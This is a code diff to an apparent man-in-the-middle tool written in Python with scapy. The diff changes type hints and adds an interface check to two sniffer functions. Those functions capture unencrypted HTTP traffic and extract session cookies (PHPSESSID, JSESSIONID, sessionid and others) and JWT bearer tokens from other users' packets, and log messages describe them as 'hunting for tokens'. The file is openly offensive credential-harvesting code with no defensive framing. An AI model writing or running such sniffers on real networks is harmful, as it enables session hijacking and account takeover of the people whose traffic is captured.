@@ -14,7 +14,7 @@ from typing import TYPE_CHECKING
 from core.mitm._scapy import Raw, TCP, IP, sniff, conf
 
 if TYPE_CHECKING:
-    from PySide6.QtCore import Signal
+    from PySide6.QtCore import SignalInstance
 
 _SESSION_KEYS = [
     "sessionid", "phpsessid", "jsessionid", "connect.sid",
@@ -24,7 +24,7 @@ _SESSION_KEYS = [
 
 # ── Cookie Sniffer ─────────────────────────────────────────────────────────────
 
-def _analyze_cookies(cookie_string: str, src_ip: str, passive_log_signal: Signal) -> None:  # type: ignore[type-arg]
+def _analyze_cookies(cookie_string: str, src_ip: str, passive_log_signal: SignalInstance) -> None:
     found_sessions: list[str] = []
     for cookie in cookie_string.split(";"):
         cookie = cookie.strip()
@@ -38,7 +38,7 @@ def _analyze_cookies(cookie_string: str, src_ip: str, passive_log_signal: Signal
             passive_log_signal.emit(f"   -> {sess}", "DATA")
 
 
-def _parse_cookie_packet(packet: object, passive_log_signal: Signal) -> None:  # type: ignore[type-arg]
+def _parse_cookie_packet(packet: object, passive_log_signal: SignalInstance) -> None:
     try:
         if not packet.haslayer(Raw) or not packet.haslayer(TCP) or not packet.haslayer(IP):  # type: ignore[union-attr]
             return
@@ -55,14 +55,16 @@ def _parse_cookie_packet(packet: object, passive_log_signal: Signal) -> None:  #
 
 def run_cookie_sniffer(
     running_flag: list[bool],
-    passive_log_signal: Signal,  # type: ignore[type-arg]
+    passive_log_signal: SignalInstance,
 ) -> None:
     """Sniff HTTP traffic for session cookies."""
     passive_log_signal.emit("Cookie & Session Sniffer Active. Listening for session tokens...", "INFO")
     passive_log_signal.emit("Targeting: sessionid, PHPSESSID, JSESSIONID, JWT, etc.", "WARN")
     while running_flag[0]:
         try:
-            sniff(
+            if conf is None or conf.iface is None:
+                break
+            sniff(  # type: ignore[misc]
                 filter="tcp port 80",
                 iface=conf.iface,
                 prn=lambda pkt: _parse_cookie_packet(pkt, passive_log_signal),
@@ -76,7 +78,7 @@ def run_cookie_sniffer(
 
 # ── Session & JWT Sniffer ──────────────────────────────────────────────────────
 
-def _parse_session_packet(packet: object, passive_log_signal: Signal) -> None:  # type: ignore[type-arg]
+def _parse_session_packet(packet: object, passive_log_signal: SignalInstance) -> None:
     try:
         if not packet.haslayer(Raw) or not packet.haslayer(TCP) or not packet.haslayer(IP):  # type: ignore[union-attr]
             return
@@ -104,14 +106,16 @@ def _parse_session_packet(packet: object, passive_log_signal: Signal) -> None:  
 
 def run_session_jwt_sniffer(
     running_flag: list[bool],
-    passive_log_signal: Signal,  # type: ignore[type-arg]
+    passive_log_signal: SignalInstance,
 ) -> None:
     """Sniff HTTP traffic specifically for Session Cookies and JWT Bearer tokens."""
     passive_log_signal.emit("Session & JWT Sniffer Active. Hunting for tokens...", "INFO")
     passive_log_signal.emit("Targeting: Set-Cookie, Authorization: Bearer", "WARN")
     while running_flag[0]:
         try:
-            sniff(
+            if conf is None or conf.iface is None:
+                break
+            sniff(  # type: ignore[misc]
                 filter="tcp port 80",
                 iface=conf.iface,
                 prn=lambda pkt: _parse_session_packet(pkt, passive_log_signal),
